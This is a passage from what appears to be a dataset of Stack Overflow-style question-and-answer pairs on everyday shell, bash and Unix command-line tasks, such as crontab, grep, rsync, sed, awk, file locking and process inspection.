    "Seeing escape characters when pressing the arrow keys in python shell": "I've solved this issue by installing readline package:\npip install readline",
    "How do I create a crontab through a script": "Here's a one-liner that doesn't use/require the new job to be in a file:\n(crontab -l 2>/dev/null; echo \"*/5 * * * * /path/to/job -with args\") | crontab -\nThe 2>/dev/null is important so that you don't get the no crontab for username message that some *nixes produce if there are currently no crontab entries.",
    "How to use `jq` in a shell pipeline?": "You need to supply a filter as an argument. To pass the JSON through unmodified other than the pretty printing jq provides by default, use the identity filter .:\ncurl -s https://api.github.com/users/octocat/repos | jq '.' | cat",
    "How to do a non-greedy match in grep?": "You're looking for a non-greedy (or lazy) match. To get a non-greedy match in regular expressions you need to use the modifier ? after the quantifier. For example you can change .* to .*?.\nBy default grep doesn't support non-greedy modifiers, but you can use grep -P to use the Perl syntax.",
    "[ :Unexpected operator in shell programming [duplicate]": "There is no mistake in your bash script. But you are executing it with sh which has a less extensive syntax\nSo, you'll need run bash ./choose.sh instead, or convert the script to use POSIX compliant sh commands only, such as = between strings instead of ==.",
    "How to implement common bash idioms in Python? [closed]": "Any shell has several sets of features.\nThe Essential Linux/Unix commands. All of these are available through the subprocess library. This isn't always the best first choice for doing all external commands. Look also at shutil for some commands that are separate Linux commands, but you could probably implement directly in your Python scripts. Another huge batch of Linux commands are in the os library; you can do these more simply in Python.\nAnd -- bonus! -- more quickly. Each separate Linux command in the shell (with a few exceptions) forks a subprocess. By using Python shutil and os modules, you don't fork a subprocess.\nThe shell environment features. This includes stuff that sets a command's environment (current directory and environment variables and what-not). You can easily manage this from Python directly.\nThe shell programming features. This is all the process status code checking, the various logic commands (if, while, for, etc.) the test command and all of it's relatives. The function definition stuff. This is all much, much easier in Python. This is one of the huge victories in getting rid of bash and doing it in Python.\nInteraction features. This includes command history and what-not. You don't need this for writing shell scripts. This is only for human interaction, and not for script-writing.\nThe shell file management features. This includes redirection and pipelines. This is trickier. Much of this can be done with subprocess. But some things that are easy in the shell are unpleasant in Python. Specifically stuff like (a | b; c ) | something >result. This runs two processes in parallel (with output of a as input to b), followed by a third process. The output from that sequence is run in parallel with something and the output is collected into a file named result. That's just complex to express in any other language.\nSpecific programs (awk, sed, grep, etc.) can often be rewritten as Python modules. Don't go overboard. Replace what you need and evolve your \"grep\" module. Don't start out writing a Python module that replaces \"grep\".\nThe best thing is that you can do this in steps.\nReplace AWK and PERL with Python. Leave everything else alone.\nLook at replacing GREP with Python. This can be a bit more complex, but your version of GREP can be tailored to your processing needs.\nLook at replacing FIND with Python loops that use os.walk. This is a big win because you don't spawn as many processes.\nLook at replacing common shell logic (loops, decisions, etc.) with Python scripts.",
    "How to send data to local clipboard from a remote SSH session": "My favorite way is ssh [remote-machine] \"cat log.txt\" | xclip -selection c. This is most useful when you don't want to (or can't) ssh from remote to local.\nOn Cygwin, ssh [remote-machine] \"cat log.txt\" > /dev/clipboard.\nA helpful comment from nbren12:\nIt is almost always possible to setup a reverse ssh connection using SSH port forwarding. Just add RemoteForward 127.0.0.1:2222 127.0.0.1:22 to the server's entry in your local .ssh/config, and then execute ssh -p 2222 127.0.0.1 on the remote machine, which will then redirect the connection to the local machine. \u2013 nbren12",
    "Retrieve CPU usage and memory usage of a single process on Linux?": "ps -p <pid> -o %cpu,%mem,cmd\n(You can leave off \"cmd\" but that might be helpful in debugging).\nNote that this gives average CPU usage of the process over the time it has been running.",
    "Add up a column of numbers at the Unix shell": "... | paste -sd+ - | bc\nis the shortest one I've found (from the UNIX Command Line blog).\nEdit: added the - argument for portability, thanks @Dogbert and @Owen.",
    "Take a full page screenshot with Firefox on the command-line": "The Developer Toolbar GCLI and Shift+F2 shortcut were removed in Firefox version 60. To take a screenshot in 60 or newer:\npress Ctrl+Shift+K to open the developer console (\u2325 Option+\u2318 Command+K on macOS)\ntype :screenshot or :screenshot --fullpage\nFind out more regarding screenshots and other features\nFor Firefox versions < 60:\nPress Shift+F2 or go to Tools > Web Developer > Developer Toolbar to open a command line. Write:\nscreenshot\nand press Enter in order to take a screenshot.\nTo fully answer the question, you can even save the whole page, not only the visible part of it:\nscreenshot --fullpage\nAnd to copy the screenshot to clipboard, use --clipboard option:\nscreenshot --clipboard --fullpage\nFirefox 18 changes the way arguments are passed to commands, you have to add \"--\" before them.\nFirefox 88.0 has a new method for taking screenshots. If extensions.screenshots.disabled is set to false in about:config, you can right-click the screen and select Take Screenshot. There's also a screenshot menu button you can add to your menu via customization.\nYou can find some documentation and the full list of commands here.\nPS. The screenshots are saved into the downloads directory by default.",
    "How to run the sftp command with a password from Bash script?": "You have a few options other than using public key authentication:\nUse keychain\nUse sshpass (less secured but probably that meets your requirement)\nUse expect (least secured and more coding needed)\nIf you decide to give sshpass a chance here is a working script snippet to do so:\nexport SSHPASS=your-password-here\nsshpass -e sftp -oBatchMode=no -b - sftp-user@remote-host << !\n   cd incoming\n   put your-log-file.log\n   bye\n!\nUpdate: However do understand that using environment variables is also insecure as using command line option -p for passing password.\nIt is better to store and read password from a file like this using -f option:\necho 'your-password-here' > ~/.passwd\nchmod 0400 ~/.passwd\n\nsshpass -f ~/.passwd -e sftp -oBatchMode=no -b - sftp-user@remote-host << !\n   cd incoming\n   put your-log-file.log\n   bye\n!",
    "How can I create nonexistent subdirectories recursively using Bash?": "You can use the -p parameter, which is documented as:\n-p, --parents\nno error if existing, make parent directories as needed\nSo:\nmkdir -p \"$BACKUP_DIR/$client/$year/$month/$day\"",
    "Grep 'binary file matches'. How to get normal grep output? [duplicate]": "Try:\ngrep --text\nor\ngrep -a \nfor short. This is equivalent to --binary-files=text and it should show the matches in binary files.",
    "How to gzip all files in all sub-directories into one compressed file in bash": "tar -zcvf compressFileName.tar.gz folderToCompress\neverything in folderToCompress will go to compressFileName\nEdit: After review and comments I realized that people may get confused with compressFileName without an extension. If you want you can use .tar.gz extension(as suggested) with the compressFileName",
    "How to kill zombie process": "A zombie is already dead, so you cannot kill it. To clean up a zombie, it must be waited on by its parent, so killing the parent should work to eliminate the zombie. (After the parent dies, the zombie will be inherited by pid 1, which will wait on it and clear its entry in the process table.) If your daemon is spawning children that become zombies, you have a bug. Your daemon should notice when its children die and wait on them to determine their exit status.\nAn example of how you might send a signal to every process that is the parent of a zombie (note that this is extremely crude and might kill processes that you do not intend. I do not recommend using this sort of sledge hammer):\n# Don't do this.  Incredibly risky sledge hammer!\nkill $(ps -A -ostat,ppid | awk '/[zZ]/ && !a[$2]++ {print $2}')",
    "How to execute XPath one-liners from shell?": "You should try these tools :\nxidel (xidel): xpath3\nxmlstarlet (xmlstarlet page) : can edit, select, transform... Not installed by default, xpath1\nxmllint (man xmllint): often installed by default with libxml2-utils, xpath1 (check my wrapper to have --xpath switch on very old releases and newlines delimited output (v < 2.9.9)). Can be used as interactive shell with the --shell switch.\nxpath : installed via perl's module XML::Xpath, xpath1\nxml_grep : installed via perl's module XML::Twig, xpath1 (limited xpath usage)\nsaxon-lint (saxon-lint): my own project, wrapper over @Michael Kay's Saxon-HE Java library, xpath3: using SaxonHE 9.6 ,XPath 3.x (+retro compatibility)\nExamples:\nxmllint --xpath '//element/@attribute' file.xml\nxmlstarlet sel -t -v \"//element/@attribute\" file.xml\nxpath -q -e '//element/@attribute' file.xml\nxidel -se '//element/@attribute' file.xml\nsaxon-lint --xpath '//element/@attribute' file.xml",
    "Check if passed argument is file or directory in Bash": "That should work. I am not sure why it's failing. You're quoting your variables properly. What happens if you use this script with double [[ ]]?\nif [[ -d $PASSED ]]; then\n    echo \"$PASSED is a directory\"\nelif [[ -f $PASSED ]]; then\n    echo \"$PASSED is a file\"\nelse\n    echo \"$PASSED is not valid\"\n    exit 1\nfi\nDouble square brackets is a bash extension to [ ]. It doesn't require variables to be quoted, not even if they contain spaces.\nAlso worth trying: -e to test if a path exists without testing what type of file it is.",
    "How to get \"wc -l\" to print just the number of lines without file name?": "Try this way:\nwc -l < file.txt",
    "Why start a shell command with a backslash?": "alias curl='curl --some --default --options'\nIf you have an alias for curl and you don't want to use it, putting a backslash in front disables the alias and runs the curl binary directly.\nNote that this only applies at an interactive shell. Aliases don't take effect in scripts so it would be unnecessary there.",
    "How to assign the output of a Bash command to a variable? [duplicate]": "Try:\npwd=`pwd`\nor\npwd=$(pwd)\nNotice no spaces after the equals sign.\nAlso as Mr. Weiss points out; you don't assign to $pwd, you assign to pwd.",
    "Git says \"Warning: Permanently added to the list of known hosts\"": "Create a ~/.ssh/config file and insert the line:\nUserKnownHostsFile ~/.ssh/known_hosts\nYou will then see the message the next time you access Github, but after that you'll not see it anymore because the host is added to the known_hosts file. This fixes the issue, rather than just hiding the log message.\nThis problem was bugging me for quite some time. The problem occurs because the OpenSSH client compiled for Windows doesn't check the known_hosts file in ~/.ssh/known_hosts\nssh -vvv git@github.com\ndebug3: check_host_in_hostfile: filename /dev/null\ndebug3: check_host_in_hostfile: filename /etc/ssh/ssh_known_hosts\ndebug3: check_host_in_hostfile: filename /dev/null\ndebug3: check_host_in_hostfile: filename /etc/ssh/ssh_known_hosts\nWarning: Permanently added 'github.com,207.97.227.239' (RSA) to the list of known hosts.",
    "How do I use the lines of a file as arguments of a command?": "If your shell is bash (amongst others), a shortcut for $(cat afile) is $(< afile), so you'd write:\nmycommand \"$(< file.txt)\"\nDocumented in the bash man page in the 'Command Substitution' section.\nAlterately, have your command read from stdin, so: mycommand < file.txt",
    "How to go to each directory and execute a command?": "This answer posted by Todd helped me.\nfind . -maxdepth 1 -type d \\( ! -name . \\) -exec bash -c \"cd '{}' && pwd\" \\;\nThe \\( ! -name . \\) avoids executing the command in current directory.",
    "run `nvm use` automatically every time there's a .nvmrc file on the directory": "If you use zsh (z shell):\nCalling 'nvm use' automatically in a directory with a .nvmrc file\nPut this into your $HOME/.zshrc to call nvm use automatically whenever you enter a directory that contains an .nvmrc file with a string telling nvm which node to use:\n# place this after nvm initialization!\nautoload -U add-zsh-hook\nload-nvmrc() {\n  local node_version=\"$(nvm version)\"\n  local nvmrc_path=\"$(nvm_find_nvmrc)\"\n\n  if [ -n \"$nvmrc_path\" ]; then\n    local nvmrc_node_version=$(nvm version \"$(cat \"${nvmrc_path}\")\")\n\n    if [ \"$nvmrc_node_version\" = \"N/A\" ]; then\n      nvm install\n    elif [ \"$nvmrc_node_version\" != \"$node_version\" ]; then\n      nvm use\n    fi\n  elif [ \"$node_version\" != \"$(nvm version default)\" ]; then\n    echo \"Reverting to nvm default version\"\n    nvm use default\n  fi\n}\nadd-zsh-hook chpwd load-nvmrc\nload-nvmrc\nMore info: https://github.com/creationix/nvm#zsh",
    "Generating random number between 1 and 10 in Bash Shell Script [duplicate]": "$(( ( RANDOM % 10 )  + 1 ))\nEDIT. Changed brackets into parenthesis according to the comment. http://web.archive.org/web/20150206070451/http://islandlinux.org/howto/generate-random-numbers-bash-scripting",
    "String comparison in bash. [[: not found": "[[ is a bash-builtin. Your /bin/bash doesn't seem to be an actual bash.\nFrom a comment:\nAdd #!/bin/bash at the top of file",
    "How to execute shell commands in JavaScript": "I'll answer assuming that when the asker said \"Shell Script\" he meant a Node.js backend JavaScript. Possibly using commander.js to use frame your code :)\nYou could use the child_process module from node's API. I pasted the example code below.\nvar exec = require('child_process').exec;\n\nexec('cat *.js bad_file | wc -l',\n    function (error, stdout, stderr) {\n        console.log('stdout: ' + stdout);\n        console.log('stderr: ' + stderr);\n        if (error !== null) {\n             console.log('exec error: ' + error);\n        }\n    });",
    "Copy folder recursively, excluding some folders": "Use rsync:\nrsync -av --exclude='path1/to/exclude' --exclude='path2/to/exclude' source destination\nNote that using source and source/ are different. A trailing slash means to copy the contents of the folder source into destination. Without the trailing slash, it means copy the folder source into destination.\nAlternatively, if you have lots of directories (or files) to exclude, you can use --exclude-from=FILE, where FILE is the name of a file containing files or directories to exclude.\n--exclude may also contain wildcards, such as --exclude=*/.svn*",
    "Iterate over a list of files with spaces": "You could replace the word-based iteration with a line-based one:\nfind . -iname \"foo*\" | while read f\ndo\n    # ... loop body\ndone",
    "Checking if output of a command contains a certain string in a shell script": "Testing $? is an anti-pattern.\nif ./somecommand | grep -q 'string'; then\n  echo \"matched\"\nfi",
    "Case insensitive comparison of strings in shell script": "In Bash, you can use parameter expansion to modify a string to all lower-/upper-case: ${var,,} for lower-case, ${var^^} for upper-case.\nvar1=TesT\nvar2=tEst\n\necho ${var1,,} ${var2,,}\necho ${var1^^} ${var2^^}",
    "How to set child process' environment variable in Makefile": "Make variables are not exported into the environment of processes make invokes... by default. However you can use make's export to force them to do so. Change:\ntest: NODE_ENV = test\nto this:\ntest: export NODE_ENV = test\n(assuming you have a sufficiently modern version of GNU make >= 3.77 ).",
    "How to find the length of an array in shell?": "$ a=(1 2 3 4)\n$ echo ${#a[@]}\n4",
    "Remove duplicate entries in a Bash script [duplicate]": "You can sort then uniq:\n$ sort -u input.txt\nOr use awk:\n$ awk '!a[$0]++' input.txt",
    "How to delete history of last 10 commands in shell?": "Have you tried editing the history file directly:\n~/.bash_history",
    "How can I check if a command exists in a shell script? [duplicate]": "In general, that depends on your shell, but if you use bash, zsh, ksh or sh (as provided by dash), the following should work:\nif ! type \"$foobar_command_name\" > /dev/null; then\n  # install foobar here\nfi\nFor a real installation script, you'd probably want to be sure that type doesn't return successfully in the case when there is an alias foobar. In bash you could do something like this:\nif ! foobar_loc=\"$(type -p \"$foobar_command_name\")\" || [[ -z $foobar_loc ]]; then\n  # install foobar here\nfi",
    "Looking for files NOT owned by a specific user": "The find(1) utility has primaries that can be negated (\"reversed\") using the \"!\" operator. On the prompt one must however escape the negation with a backslash as it is a shell metacharacter. Result:\nfind . \\! -user foo -print",
    "Print a file's last modified date in Bash": "Isn't the 'date' command much simpler? No need for awk, stat, etc.\ndate -r <filename>\nAlso, consider looking at the man page for date formatting; for example with common date and time format:\ndate -r <filename> \"+%m-%d-%Y %H:%M:%S\"",
    "What is the difference between a directory and a folder?": "Check \"The folder metaphor\" section at Wikipedia. It states:\nThere is a difference between a directory, which is a file system concept, and the graphical user interface metaphor that is used to represent it (a folder). For example, Microsoft Windows uses the concept of special folders to help present the contents of the computer to the user in a fairly consistent way that frees the user from having to deal with absolute directory paths, which can vary between versions of Windows, and between individual installations. ...\nIf one is referring to a container of documents, the term folder is more appropriate. The term directory refers to the way a structured list of document files and folders is stored on the computer. The distinction can be due to the way a directory is accessed; on Unix systems, /usr/bin/ is usually referred to as a directory when viewed in a command line console, but if accessed through a graphical file manager, users may sometimes call it a folder.",
    "How do I get bash completion to work with aliases?": "As stated in the comments above,\ncomplete -o default -o nospace -F _git_checkout gco\nwill no longer work. However, there's a __git_complete function in git-completion.bash which can be used to set up completion for aliases like so:\n__git_complete gco _git_checkout",
    "How to copy a file to multiple directories using the gnu cp command": "You can't do this with cp alone but you can combine cp with xargs:\necho dir1 dir2 dir3 | xargs -n 1 cp file1\nWill copy file1 to dir1, dir2, and dir3. xargs will call cp 3 times to do this, see the man page for xargs for details.",
    "How to get a shell environment variable in a makefile?": "If you've exported the environment variable:\nexport demoPath=/usr/local/demo\nyou can simply refer to it by name in the makefile (make imports all the environment variables you have set):\nDEMOPATH = ${demoPath}    # Or $(demoPath) if you prefer.\nIf you've not exported the environment variable, it is not accessible until you do export it, or unless you pass it explicitly on the command line:\nmake DEMOPATH=\"${demoPath}\" \u2026\nIf you are using a C shell derivative, substitute setenv demoPath /usr/local/demo for the export command.",
    "Asynchronous shell exec in PHP": "",
    "ZSH alias with parameter": "If you really need to use an alias with a parameter for some reason, you can hack it by embedding a function in your alias and immediately executing it:\nalias example='f() { echo Your arg was $1. };f'\nI see this approach used a lot in .gitconfig aliases.",
    "Shell script to delete directories older than n days": "This will do it recursively for you:\nfind /path/to/base/dir/* -type d -ctime +10 -exec rm -rf {} \\;\nExplanation:\nfind: the unix command for finding files / directories / links etc.\n/path/to/base/dir: the directory to start your search in.\n-type d: only find directories\n-ctime +10: only consider the ones with modification time older than 10 days\n-exec ... \\;: for each such result found, do the following command in ...\nrm -rf {}: recursively force remove the directory; the {} part is where the find result gets substituted into from the previous part.\nAlternatively, use:\nfind /path/to/base/dir/* -type d -ctime +10 | xargs rm -rf\nWhich is a bit more efficient, because it amounts to:\nrm -rf dir1 dir2 dir3 ...\nas opposed to:\nrm -rf dir1; rm -rf dir2; rm -rf dir3; ...\nas in the -exec method.\nWith modern versions of find, you can replace the ; with + and it will do the equivalent of the xargs call for you, passing as many files as will fit on each exec system call:\nfind . -type d -ctime +10 -exec rm -rf {} +",
    "rsync copy over only certain types of files using include option": "I think --include is used to include a subset of files that are otherwise excluded by --exclude, rather than including only those files. In other words: you have to think about include meaning don't exclude.\nTry instead:\nrsync -zarv  --include \"*/\" --exclude=\"*\" --include=\"*.sh\" \"$from\" \"$to\"\nFor rsync version 3.0.6 or higher, the order needs to be modified as follows (see comments):\nrsync -zarv --include=\"*/\" --include=\"*.sh\" --exclude=\"*\" \"$from\" \"$to\"\nAdding the -m flag will avoid creating empty directory structures in the destination. Tested in version 3.1.2.\nSo if we only want *.sh files we have to exclude all files --exclude=\"*\", include all directories --include=\"*/\" and include all *.sh files --include=\"*.sh\".\nYou can find some good examples in the section Include/Exclude Pattern Rules of the man page",
    "What is the difference between ${var}, \"$var\", and \"${var}\" in the Bash shell?": "Braces ($var vs. ${var})\nIn most cases, $var and ${var} are the same:\nvar=foo\necho $var\n# foo\necho ${var}\n# foo\nThe braces are only needed to resolve ambiguity in expressions:\nvar=foo\necho $varbar\n# Prints nothing because there is no variable 'varbar'\necho ${var}bar\n# foobar\nQuotes ($var vs. \"$var\" vs. \"${var}\")\nWhen you add double quotes around a variable, you tell the shell to treat it as a single word, even if it contains whitespaces:\nvar=\"foo bar\"\nfor i in \"$var\"; do # Expands to 'for i in \"foo bar\"; do...'\n    echo $i         #   so only runs the loop once\ndone\n# foo bar\nContrast that behavior with the following:\nvar=\"foo bar\"\nfor i in $var; do # Expands to 'for i in foo bar; do...'\n    echo $i       #   so runs the loop twice, once for each argument\ndone\n# foo\n# bar\nAs with $var vs. ${var}, the braces are only needed for disambiguation, for example:\nvar=\"foo bar\"\nfor i in \"$varbar\"; do # Expands to 'for i in \"\"; do...' since there is no\n    echo $i            #   variable named 'varbar', so loop runs once and\ndone                   #   prints nothing (actually \"\")\n\nvar=\"foo bar\"\nfor i in \"${var}bar\"; do # Expands to 'for i in \"foo barbar\"; do...'\n    echo $i              #   so runs the loop once\ndone\n# foo barbar\nNote that \"${var}bar\" in the second example above could also be written \"${var}\"bar, in which case you don't need the braces anymore, i.e. \"$var\"bar. However, if you have a lot of quotes in your string these alternative forms can get hard to read (and therefore hard to maintain). This page provides a good introduction to quoting in Bash.\nArrays ($var vs. $var[@] vs. ${var[@]})\nNow for your array. According to the bash manual:\nReferencing an array variable without a subscript is equivalent to referencing the array with a subscript of 0.\nIn other words, if you don't supply an index with [], you get the first element of the array:\nfoo=(a b c)\necho $foo\n# a\nWhich is exactly the same as\nfoo=(a b c)\necho ${foo}\n# a\nTo get all the elements of an array, you need to use @ as the index, e.g. ${foo[@]}. The braces are required with arrays because without them, the shell would expand the $foo part first, giving the first element of the array followed by a literal [@]:\nfoo=(a b c)\necho ${foo[@]}\n# a b c\necho $foo[@]\n# a[@]\nThis page is a good introduction to arrays in Bash.\nQuotes revisited (${foo[@]} vs. \"${foo[@]}\")\nYou didn't ask about this but it's a subtle difference that's good to know about. If the elements in your array could contain whitespace, you need to use double quotes so that each element is treated as a separate \"word:\"\nfoo=(\"the first\" \"the second\")\nfor i in \"${foo[@]}\"; do # Expands to 'for i in \"the first\" \"the second\"; do...'\n    echo $i              #   so the loop runs twice\ndone\n# the first\n# the second\nContrast this with the behavior without double quotes:\nfoo=(\"the first\" \"the second\")\nfor i in ${foo[@]}; do # Expands to 'for i in the first the second; do...'\n    echo $i            #   so the loop runs four times!\ndone\n# the\n# first\n# the\n# second",
    "Quick-and-dirty way to ensure only one instance of a shell script is running at a time": "Use flock(1) to make an exclusive scoped lock a on file descriptor. This way you can even synchronize different parts of the script.\n#!/bin/bash\n\n(\n  # Wait for lock on /var/lock/.myscript.exclusivelock (fd 200) for 10 seconds\n  flock -x -w 10 200 || exit 1\n\n  # Do stuff\n\n) 200>/var/lock/.myscript.exclusivelock\nThis ensures that code between ( and ) is run only by one process at a time and that the process doesn\u2019t wait too long for a lock.\nCaveat: this particular command is a part of util-linux. If you run an operating system other than Linux, it may or may not be available.",
    "Efficiently test if a port is open on Linux?": "A surprise I found out recently is that Bash natively supports tcp connections as file descriptors. To use:\nexec 6<>/dev/tcp/ip.addr.of.server/445\necho -e \"GET / HTTP/1.0\\n\" >&6\ncat <&6\nI'm using 6 as the file descriptor because 0,1,2 are stdin, stdout, and stderr. 5 is sometimes used by Bash for child processes, so 3,4,6,7,8, and 9 should be safe.\nAs per the comment below, to test for listening on a local server in a script:\nexec 6<>/dev/tcp/127.0.0.1/445 || echo \"No one is listening!\"\nexec 6>&- # close output connection\nexec 6<&- # close input connection\nTo determine if someone is listening, attempt to connect by loopback. If it fails, then the port is closed or we aren't allowed access. Afterwards, close the connection.\nModify this for your use case, such as sending an email, exiting the script on failure, or starting the required service.",
    "How to use find command to find all files with extensions from list?": "find /path/to -regex \".*\\.\\(jpg\\|gif\\|png\\|jpeg\\)\" > log",
    "Viewing full output of PS command": "Using the auxww flags, you will see the full path to output in both your terminal window and from shell scripts.\ndarragh@darraghserver ~ $uname -a\nSunOS darraghserver 5.10 Generic_142901-13 i86pc i386 i86pc\n\ndarragh@darraghserver ~ $which ps\n/usr/bin/ps<br>\n\ndarragh@darraghserver ~ $/usr/ucb/ps auxww | grep ps\ndarragh 13680  0.0  0.0 3872 3152 pts/1    O 14:39:32  0:00 /usr/ucb/ps -auxww\ndarragh 13681  0.0  0.0 1420  852 pts/1    S 14:39:32  0:00 grep ps\nps aux lists all processes executed by all users. See man ps for details. The ww flag sets unlimited width.\n-w         Wide output. Use this option twice for unlimited width.\nw          Wide output. Use this option twice for unlimited width.\nI found the answer on the following blog:\nhttp://www.snowfrog.net/2010/06/10/solaris-ps-output-truncated-at-80-columns/",
    "How to delete duplicate lines in a file without sorting it in Unix": "awk '!seen[$0]++' file.txt\nseen is an associative array that AWK will pass every line of the file to. If a line isn't in the array then seen[$0] will evaluate to false. The ! is the logical NOT operator and will invert the false to true. AWK will print the lines where the expression evaluates to true.\nThe ++ increments seen so that seen[$0] == 1 after the first time a line is found and then seen[$0] == 2, and so on. AWK evaluates everything but 0 and \"\" (empty string) to true. If a duplicate line is placed in seen then !seen[$0] will evaluate to false and the line will not be written to the output.",
    "List files with certain extensions with ls and grep": "Why not:\nls *.{mp3,exe,mp4}\nI'm not sure where I learned it - but I've been using this.",
    "How to get the part of a file after the first line that matches a regular expression": "The following will print the line matching TERMINATE till the end of the file:\nsed -n -e '/TERMINATE/,$p'\nExplained: -n disables default behavior of sed of printing each line after executing its script on it, -e indicated a script to sed, /TERMINATE/,$ is an address (line) range selection meaning the first line matching the TERMINATE regular expression (like grep) to the end of the file ($), and p is the print command which prints the current line.\nThis will print from the line that follows the line matching TERMINATE till the end of the file: (from AFTER the matching line to EOF, NOT including the matching line)\nsed -e '1,/TERMINATE/d'\nExplained: 1,/TERMINATE/ is an address (line) range selection meaning the first line for the input to the 1st line matching the TERMINATE regular expression, and d is the delete command which delete the current line and skip to the next line. As sed default behavior is to print the lines, it will print the lines after TERMINATE to the end of input.\nIf you want the lines before TERMINATE:\nsed -e '/TERMINATE/,$d'\nAnd if you want both lines before and after TERMINATE in two different files in a single pass:\nsed -e '1,/TERMINATE/w before\n/TERMINATE/,$w after' file\nThe before and after files will contain the line with terminate, so to process each you need to use:\nhead -n -1 before\ntail -n +2 after\nIF you do not want to hard code the filenames in the sed script, you can:\nbefore=before.txt\nafter=after.txt\nsed -e \"1,/TERMINATE/w $before\n/TERMINATE/,\\$w $after\" file\nBut then you have to escape the $ meaning the last line so the shell will not try to expand the $w variable (note that we now use double quotes around the script instead of single quotes).\nI forgot to tell that the new line is important after the filenames in the script so that sed knows that the filenames end.\nHow would you replace the hardcoded TERMINATE by a variable?\nYou would make a variable for the matching text and then do it the same way as the previous example:\nmatchtext=TERMINATE\nbefore=before.txt\nafter=after.txt\nsed -e \"1,/$matchtext/w $before\n/$matchtext/,\\$w $after\" file\nto use a variable for the matching text with the previous examples:\n## Print the line containing the matching text, till the end of the file:\n## (from the matching line to EOF, including the matching line)\nmatchtext=TERMINATE\nsed -n -e \"/$matchtext/,\\$p\"\n## Print from the line that follows the line containing the\n## matching text, till the end of the file:\n## (from AFTER the matching line to EOF, NOT including the matching line)\nmatchtext=TERMINATE\nsed -e \"1,/$matchtext/d\"\n## Print all the lines before the line containing the matching text:\n## (from line-1 to BEFORE the matching line, NOT including the matching line)\nmatchtext=TERMINATE\nsed -e \"/$matchtext/,\\$d\"\nThe important points about replacing text with variables in these cases are:\nVariables ($variablename) enclosed in single quotes ['] won't \"expand\" but variables inside double quotes [\"] will. So, you have to change all the single quotes to double quotes if they contain text you want to replace with a variable.\nThe sed ranges also contain a $ and are immediately followed by a letter like: $p, $d, $w. They will also look like variables to be expanded, so you have to escape those $ characters with a backslash [\\] like: \\$p, \\$d, \\$w.",
    "How to remove the lines which appear on file B from another file A?": "If the files are sorted (they are in your example):\ncomm -23 file1 file2\n-23 suppresses the lines that are in both files, or only in file 2. If the files are not sorted, pipe them through sort first...\nSee the man page here",
    "How to use sed to remove the last n lines of a file": "I don't know about sed, but it can be done with head:\nhead -n -2 myfile.txt",
    "How do I remove newlines from a text file?": "tr --delete '\\n' < yourfile.txt\ntr -d '\\n' < yourfile.txt\nIf none of the commands posted here are working, then you have something other than a newline separating your fields. Possibly you have DOS/Windows line endings in the file (although I would expect the Perl solutions to work even in that case)?\nTry:\ntr -d \"\\n\\r\" < yourfile.txt\nIf that doesn't work then you're going to have to inspect your file more closely (e.g., in a hex editor) to find out what characters are actually in there that you want to remove.",
    "How to process each output line in a loop?": "One of the easy ways is not to store the output in a variable, but directly iterate over it with a while/read loop.\nSomething like:\ngrep xyz abc.txt | while read -r line ; do\n    echo \"Processing $line\"\n    # your code goes here\ndone\nThere are variations on this scheme depending on exactly what you're after.\nIf you need to change variables inside the loop (and have that change be visible outside of it), you can use process substitution as stated in fedorqui's answer:\nwhile read -r line ; do\n    echo \"Processing $line\"\n    # your code goes here\ndone < <(grep xyz abc.txt)",
    "Exiting a script upon encountering an error": "If you put set -e in a script, the script will terminate as soon as any command inside it fails (i.e. as soon as any command returns a nonzero status). This doesn't let you write your own message, but often the failing command's own messages are enough.\nThe advantage of this approach is that it's automatic: you don't run the risk of forgetting to deal with an error case.\nCommands whose status is tested by a conditional (such as if, && or ||) do not terminate the script (otherwise the conditional would be pointless). An idiom for the occasional command whose failure doesn't matter is command-that-may-fail || true. You can also turn set -e off for a part of the script with set +e.",
    "The 'eval' command in Bash and its typical uses": "eval takes a string as its argument, and evaluates it as if you'd typed that string on a command line. (If you pass several arguments, they are first joined with spaces between them.)\n${$n} is a syntax error in bash. Inside the braces, you can only have a variable name, with some possible prefix and suffixes, but you can't have arbitrary bash syntax and in particular you can't use variable expansion. There is a way of saying \u201cthe value of the variable whose name is in this variable\u201d, though:\necho ${!n}\none\n$(\u2026) runs the command specified inside the parentheses in a subshell (i.e. in a separate process that inherits all settings such as variable values from the current shell), and gathers its output. So echo $($n) runs $n as a shell command, and displays its output. Since $n evaluates to 1, $($n) attempts to run the command 1, which does not exist.\neval echo \\${$n} runs the parameters passed to eval. After expansion, the parameters are echo and ${1}. So eval echo \\${$n} runs the command echo ${1}.\nNote that most of the time, you must use double quotes around variable substitutions and command substitutions (i.e. anytime there's a $): \"$foo\", \"$(foo)\". Always put double quotes around variable and command substitutions, unless you know you need to leave them off. Without the double quotes, the shell performs field splitting (i.e. it splits value of the variable or the output from the command into separate words) and then treats each word as a wildcard pattern. For example:\n$ ls\nfile1 file2 otherfile\n$ set -- 'f* *'\n$ echo \"$1\"\nf* *\n$ echo $1\nfile1 file2 file1 file2 otherfile\n$ n=1\n$ eval echo \\${$n}\nfile1 file2 file1 file2 otherfile\n$eval echo \\\"\\${$n}\\\"\nf* *\n$ echo \"${!n}\"\nf* *\neval is not used very often. In some shells, the most common use is to obtain the value of a variable whose name is not known until runtime. In bash, this is not necessary thanks to the ${!VAR} syntax. eval is still useful when you need to construct a longer command containing operators, reserved words, etc.",
    "Rename all files in directory from $filename_h to $filename_half?": "Just use bash, no need to call external commands.\nfor file in *_h.png\ndo\n  mv \"$file\" \"${file/_h.png/_half.png}\"\ndone\nDo not add #!/bin/sh\nFor those that need that one-liner:\nfor file in *.png; do mv \"$file\" \"${file/_h.png/_half.png}\"; done",
    "Why use make over a shell script?": "The general idea is that make supports (reasonably) minimal rebuilds -- i.e., you tell it what parts of your program depend on what other parts. When you update some part of the program, it only rebuilds the parts that depend on that. While you could do this with a shell script, it would be a lot more work (explicitly checking the last-modified dates on all the files, etc.) The only obvious alternative with a shell script is to rebuild everything every time. For tiny projects this is a perfectly reasonable approach, but for a big project a complete rebuild could easily take an hour or more -- using make, you might easily accomplish the same thing in a minute or two...\nI should probably also add that there are quite a few alternatives to make that have at least broadly similar capabilities. Especially in cases where only a few files in a large project are being rebuilt, some of them (e.g., Ninja) are often considerably faster than make.",
    "Get first line of a shell command's output": "Yes, that is one way to get the first line of output from a command.\nIf the command outputs anything to standard error that you would like to capture in the same manner, you need to redirect the standard error of the command to the standard output stream:\nutility 2>&1 | head -n 1\nThere are many other ways to capture the first line too, including sed 1q (quit after first line), sed -n 1p (only print first line, but read everything), awk 'FNR == 1' (only print first line, but again, read everything) etc.",
    "How to create a database from shell command in MySQL?": "You mean while the mysql environment?\ncreate database testdb;\nOr directly from command line:\nmysql -u root -e \"create database testdb\"; ",
